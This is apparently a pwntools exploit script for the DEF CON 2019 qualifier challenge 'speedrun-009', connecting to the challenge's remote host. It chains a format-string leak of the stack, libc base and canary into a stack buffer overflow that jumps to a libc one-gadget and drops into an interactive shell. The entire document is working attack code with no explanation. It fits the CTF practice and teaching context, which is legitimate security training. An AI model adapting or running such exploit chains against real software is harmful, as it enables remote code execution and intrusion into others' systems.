#!/usr/bin/env python
from pwn import *

def bof(payload):
    s.sendafter('3\n', '1')
    s.send(payload)

def fsb(payload):
    s.sendafter('3\n', '2')
    s.send(payload + '\0')
    s.recvuntil('it "')
    return s.recvuntil('"?')[:-2]

def end():
    s.sendafter('3\n', '3')

if len(sys.argv) == 1:
    s = process('./speedrun-009')
else:
    s = remote('speedrun-009.quals2019.oooverflow.io', 31337)

stack_addr = int(fsb('%p'), 0x10)
log.info('stack address: %#x' % stack_addr)
libc_base = int(fsb('%2$p'), 0x10) - 0x3ed8c0
log.info('libc base: %#x' % libc_base)
canary = int(fsb('%163$p'), 0x10)
log.info('canary: %#x' % canary)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
payload = ''
payload += 'A' * 0x408
payload += p64(canary)
payload += 'A' * 8
payload += p64(libc_base + one_gadgets[0])
bof(payload)

end()
s.interactive()
